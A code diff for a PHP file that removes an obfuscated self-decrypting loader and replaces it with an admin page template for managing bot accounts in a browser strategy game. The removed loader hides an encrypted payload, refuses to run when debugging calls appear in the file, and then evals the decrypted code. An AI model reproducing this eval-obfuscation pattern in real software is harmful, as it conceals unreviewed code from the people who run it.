@@ -1,24 +1,107 @@
-<?php
-$nmtwagknr="deffaf26ba8dda20f16734b0abb99944";
-$lfetfhrx="5503525157050a0403510b06025357075307070752555b56555a035b0b5b0d01";
-$wppewu="SbyZYFsM2gpxzo2wmDU6WZq2ZRhk237ngOqc5c8Wk6VAQPCdJQRVlbruWp2dv3awiaZh2Ezjb9fT3XitAYHwE6tbWA9X4VLfGhHmRsJRQEDnTj6rep95ULsGuAy1YSPxDf/UzfITG1JRErxK5uj6CFhkk/36YeYFZnDUQI29iAyM4wGtDrE2clKXr8BIWFqRZHxJeOfeePquj4B1YiiT5FnjdqgJcsReY85hIKof6J41U3keiViYOoQlaN7QEXU4pq/sH3jwhbI7UKLr43zkRh9udaVPHG74W+iUITtwq7W2jUiEPdT2KmKd/COIdipVUieB11CCs9u3gZUZJIgadb3MlPOH6t71DXh2xOlTUYR/tVG7nipvqn9DwDYD6/hxA5aJY1yAKfgNBk+tfMv3bM29W8jHZZM48QphfT8/ABxW0UV5sI08pnlvi5SuPXuv/cFfl7Je0/SxjAvPJsl4nAX9egYcDqx+ly1Hr1Ka4fEQ6XqJenJN/dlgTPCpxqAU10vxHQeTstUBnck8D+1GnpU6ExljMfyHALm11EFOZ2xCHygcBPx24baF5I+4THFL+o6zbuXa9X6tAOlY6acldIs16q7SgxeUC7+Hc3aocI6AePi+04aE9G0qAY8dejTal94cIlR+rx8Ajm+g+p/sTMsnQFN6JQa4P4NzoEhcaYUWoq8V8M30L0YkpIiy8yL8jnW0aQe6KxWRzsCoID7OMlVN1DJaK4JsN/7vM5Vz3Fj9k3fHmBTcdEGsZwRAqTqyPEMa5p327Lf7mderh3ZL40jXc+BcHWn9PsmXI//eoMCLCwWa/ExKPkm7e/c7sKGGOpsVry8+4PzGtuqoTW0JWH5joteyn/2HuC4wjIndsjKKeamSRTMpnOomSFPzyiZop5oomU1beIyzfDJGWH0njvCoyTaL6z6YZVDGWHkT+WgGD1rW5pGnyDp5olS86Q15q53ErQWQN7LiTnAIrgF+WLWZfJHhlQOKf9CsKy+uhZvRKGluedt9U5PAchuCOPSQJH+4MNn5GmaRDe2PaiBm/Q4R3FfsYDMEbcyjjFb990D2Q6LVVqKrz+v84TXUhhJvHSUC5p1+0drg+qQADJ2DS/b3eK/Wj+HFdah/Rx7lQBZix0FQcIptB077ANEP2vGp1QZAeib6fvJw2NKZYi88UTlw2keIvxc+91ux30UtTOuyOWg0i942lTXn3bSryc5O2iCDciKKr12IurmDWP7qRXRsLpl/9tUO0v3FtmThWx/uXvvZ1pVohf5UAMWcniUCCvPL7efWNwXw5ZY86QEI8W173M8Kp5GF23MWvH55lkC2ZwoKB3jfWL7roJNHvinj9iWN/6PMikbMQZPROYfeIvtJ7sWt+ASmOypBfN7vLMqI2O76ouBN0UNw8Ajvr/bd/67sZoS5TWHSkjKtkrhJjQO94CvW6a/kM3aBBQt57zR8lMPuDM9eaWpRNBKKk8kn4sCbzRPiRPsZX6rxrL9iXJ4JbLFBE+fduo10fp2spKj0SmfJ172Kj8w3USheIA==";
-$jgkzynddbo=file_get_contents(__FILE__);
-$masrkpqt=str_replace($wppewu,"",$jgkzynddbo);
-if(strpos($masrkpqt,"ec"."ho")!==false||strpos($masrkpqt,"pr"."int")!==false||strpos($masrkpqt,"var_"."dump")!==false||strpos($masrkpqt,"file_put_"."contents")!==false||strpos($masrkpqt,"fw"."rite")!==false){die();}
-$olapwege=str_replace(array($nmtwagknr,$lfetfhrx),array("SP_47ffb782","KP_b4d3f69b"),$jgkzynddbo);
-$peeguee=md5($olapwege);
-$fuzfji=hex2bin($lfetfhrx);
-$dalcgjfndbw="";
-$gsnwxyfldj=strlen($peeguee);
-for($kphekgog=0;$kphekgog<$gsnwxyfldj;$kphekgog++){
-$dalcgjfndbw.=chr(ord($fuzfji[$kphekgog])^ord($peeguee[$kphekgog]));
-}
-$uwhmovjup=base64_decode($wppewu);
-$hvfydswh=strlen($uwhmovjup);
-$kwpjrpzw="";
-$qjmotys=strlen($dalcgjfndbw);
-for($kphekgog=0;$kphekgog<$hvfydswh;$kphekgog++){
-$kwpjrpzw.=$uwhmovjup[$kphekgog]^$dalcgjfndbw[$kphekgog%$qjmotys];
-}
-$hfykrsooj="gzun"."compress";
-eval('?>' . $hfykrsooj($kwpjrpzw) . '<?php ');
+<h2><i class="fas fa-robot"></i> <?= __('admin.bot.title') ?></h2>
+<p style="color: #5c3a1e;"><?= __('admin.bot.desc') ?></p>
+
+<?php if (!empty($error)): ?>
+    <div class="admin-alert error">
+        <i class="fas fa-exclamation-triangle"></i> <?= htmlspecialchars($error) ?>
+    </div>
+<?php endif; ?>
+
+<?php if (!empty($success)): ?>
+    <div class="admin-alert success">
+        <i class="fas fa-check-circle"></i> <?= htmlspecialchars($success) ?>
+    </div>
+<?php endif; ?>
+
+<div class="admin-card">
+    <h3><i class="fas fa-plus-circle"></i> <?= __('admin.bot.add_bot') ?></h3>
+    <form method="post" action="<?= $adminBaseUrl ?>&mode=bot&action=add_bot">
+        <table class="vis" width="100%">
+            <tr>
+                <td width="200"><strong><?= __('admin.bot.username') ?></strong></td>
+                <td>
+                    <input type="text" name="username" placeholder="<?= __('admin.bot.placeholder') ?>" style="width: 300px;"
+                        required>
+                    <button type="submit" class="btn" style="margin-left: 10px; background: #4caf50; border-color: #388e3c; color: white;">
+                        <i class="fas fa-robot"></i> <?= __('admin.bot.mark_bot') ?>
+                    </button>
+                </td>
+            </tr>
+        </table>
+    </form>
+</div>
+
+<div class="admin-card">
+    <h3><i class="fas fa-list"></i> <?= __('admin.bot.active_bots') ?></h3>
+
+    <?php if (!empty($botUsers)): ?>
+        <table class="vis" width="100%">
+            <tr>
+                <th><?= __('admin.bot.col_id') ?></th>
+                <th><?= __('admin.bot.col_name') ?></th>
+                <th><?= __('admin.bot.col_points') ?></th>
+                <th><?= __('admin.bot.col_villages') ?></th>
+                <th><?= __('admin.bot.col_ally') ?></th>
+                <th><?= __('admin.bot.col_actions') ?></th>
+            </tr>
+            <?php foreach ($botUsers as $bot): ?>
+                <tr>
+                    <td><?= $bot['id'] ?></td>
+                    <td>
+                        <i class="fas fa-robot" style="color: #999;"></i>
+                        <a href="game.php?village=<?= $village['id'] ?>&screen=info_player&id=<?= $bot['id'] ?>">
+                            <?= htmlspecialchars($bot['username']) ?>
+                        </a>
+                    </td>
+                    <td><?= number_format($bot['points'] ?? 0, 0, ',', '.') ?></td>
+                    <td><?= $bot['villages'] ?? 0 ?></td>
+                    <td><?= $bot['ally'] > 0 ? $bot['ally'] : '-' ?></td>
+                    <td align="center">
+                        <a href="<?= $adminBaseUrl ?>&mode=bot&action=remove_bot&id=<?= $bot['id'] ?>"
+                            class="btn" style="padding: 2px 8px; font-size: 10px; background: #f44336;"
+                            onclick="return confirm('<?= sprintf(__('admin.bot.remove_confirm'), addslashes(htmlspecialchars($bot['username']))) ?>');">
+                            <i class="fas fa-times"></i> <?= __('admin.bot.remove_bot') ?>
+                        </a>
+                    </td>
+                </tr>
+            <?php endforeach; ?>
+        </table>
+    <?php else: ?>
+        <p style="text-align: center; padding: 20px; color: #999;">
+            <i class="fas fa-info-circle" style="font-size: 24px;"></i><br><br>
+            <?= __('admin.bot.no_bots') ?>
+        </p>
+    <?php endif; ?>
+</div>
+
+<div class="admin-card">
+    <h3><i class="fas fa-info-circle"></i> <?= __('admin.bot.info_title') ?></h3>
+    <p><strong><?= __('admin.bot.info_q') ?></strong></p>
+    <ul>
+        <li><?= __('admin.bot.info_1') ?></li>
+        <li><?= __('admin.bot.info_2') ?></li>
+        <li><?= __('admin.bot.info_3') ?></li>
+        <li><?= __('admin.bot.info_4') ?></li>
+    </ul>
+</div>
+
+<style>
+    .admin-alert {
+        padding: 15px;
+        margin-bottom: 20px;
+        border-radius: 4px;
+        border-left: 4px solid;
+    }
+
+    .admin-alert.error {
+        background: #ffebee;
+        border-color: #f44336;
+        color: #c62828;
+    }
+
+    .admin-alert.success {
+        background: #e8f5e9;
+        border-color: #4caf50;
+        color: #2e7d32;
+    }
+</style>
